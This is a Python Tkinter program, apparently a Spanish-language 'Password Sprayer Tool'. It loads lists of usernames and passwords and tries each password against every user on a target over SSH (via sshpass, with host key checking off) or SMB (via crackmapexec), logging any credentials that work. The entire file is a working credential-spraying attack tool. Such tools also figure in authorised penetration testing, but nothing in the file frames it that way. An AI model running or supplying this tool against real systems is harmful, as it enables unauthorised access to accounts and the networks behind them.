import tkinter as tk
from tkinter import filedialog, messagebox, ttk
import subprocess
import threading

class SprayzerGUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Password Sprayer Tool")
        self.geometry("600x450")
        self.protocol("WM_DELETE_WINDOW", self.on_exit)

        self.target_var = tk.StringVar()
        self.protocol_var = tk.StringVar(value="ssh")
        self.port_var = tk.StringVar(value="22")
        self.users_file = ""
        self.passwords_file = ""

        self.create_widgets()

    def create_widgets(self):
        tk.Label(self, text="Target IP/Dominio:").pack(pady=5)
        tk.Entry(self, textvariable=self.target_var, width=50).pack()

        tk.Label(self, text="Protocolo:").pack(pady=5)
        ttk.Combobox(self, textvariable=self.protocol_var, values=["ssh", "smb"], state="readonly").pack()

        tk.Label(self, text="Puerto (solo SSH):").pack(pady=5)
        tk.Entry(self, textvariable=self.port_var, width=10).pack()

        tk.Button(self, text="Seleccionar archivo de usuarios", command=self.load_users).pack(pady=5)
        tk.Button(self, text="Seleccionar archivo de contraseñas", command=self.load_passwords).pack(pady=5)

        self.log_box = tk.Text(self, height=15, bg="black", fg="lime", font=("Consolas", 10))
        self.log_box.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)

        tk.Button(self, text="Iniciar Spraying", command=self.start_spraying).pack(pady=10)

    def log(self, message):
        self.log_box.insert(tk.END, message + "\n")
        self.log_box.see(tk.END)

    def load_users(self):
        path = filedialog.askopenfilename(title="Selecciona lista de usuarios")
        if path:
            self.users_file = path
            self.log(f"[+] Cargado archivo de usuarios: {path}")

    def load_passwords(self):
        path = filedialog.askopenfilename(title="Selecciona lista de contraseñas")
        if path:
            self.passwords_file = path
            self.log(f"[+] Cargado archivo de contraseñas: {path}")

    def start_spraying(self):
        if not self.target_var.get() or not self.users_file or not self.passwords_file:
            messagebox.showerror("Error", "Faltan campos por completar.")
            return
        threading.Thread(target=self.run_spraying, daemon=True).start()

    def run_spraying(self):
        target = self.target_var.get()
        protocol = self.protocol_var.get()
        port = self.port_var.get()

        with open(self.users_file) as uf:
            users = [u.strip() for u in uf if u.strip()]
        with open(self.passwords_file) as pf:
            passwords = [p.strip() for p in pf if p.strip()]

        for password in passwords:
            self.log(f"[*] Probando contraseña: {password}")
            for user in users:
                self.log(f"    ➤ {user}:{password}")
                if protocol == "ssh":
                    result = subprocess.run(
                        ["sshpass", "-p", password, "ssh", f"{user}@{target}", "-p", port, "-oStrictHostKeyChecking=no", "-oConnectTimeout=5", "exit"],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                    )
                    if result.returncode == 0:
                        self.log(f"[✔] Credencial válida: {user}:{password}")
                elif protocol == "smb":
                    result = subprocess.run(
                        ["crackmapexec", "smb", target, "-u", user, "-p", password, "--no-bruteforce"],
                        stdout=subprocess.PIPE, stderr=subprocess.DEVNULL
                    )
                    output = result.stdout.decode()
                    if "Pwn3d!" in output or "[+]" in output:
                        self.log(f"[✔] Credencial válida: {user}:{password}")
        self.log("[✓] Spraying finalizado.")

    def on_exit(self):
        self.destroy()

if __name__ == "__main__":
    app = SprayzerGUI()
    app.mainloop()
